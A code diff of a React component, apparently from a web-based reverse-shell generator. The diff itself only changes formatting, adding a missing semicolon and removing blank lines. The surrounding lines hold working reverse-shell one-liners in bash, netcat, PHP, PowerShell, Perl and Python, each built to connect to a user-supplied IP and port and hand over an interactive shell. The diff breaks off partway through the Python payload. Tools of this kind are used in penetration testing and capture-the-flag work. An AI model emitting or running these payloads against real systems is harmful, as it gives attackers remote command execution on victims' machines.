@@ -1,7 +1,7 @@
 import React from 'react';
 import { Button, message, Typography, Row, Col, Divider, Input } from 'antd';
 import { CopyOutlined, WifiOutlined, LinkOutlined, createFromIconfontCN } from '@ant-design/icons';
-import  PersistedState from 'use-persisted-state';
+import PersistedState from 'use-persisted-state';
 import QueueAnim from 'rc-queue-anim';
 import Clipboard from 'react-clipboard.js';
 
@@ -11,11 +11,7 @@ const IconFont = createFromIconfontCN({
 });
 
 export default (props) => {
-
 	const useIPv4State = PersistedState('ipv4_tcp_cache');
-
-
-
 	const [ values, setValues ] = useIPv4State({
 		ip: '',
 		port: ''
@@ -32,7 +28,7 @@ export default (props) => {
 	const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
 	const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`;
 	const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
-	const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+	const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
 	const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
 	const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()
   s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))
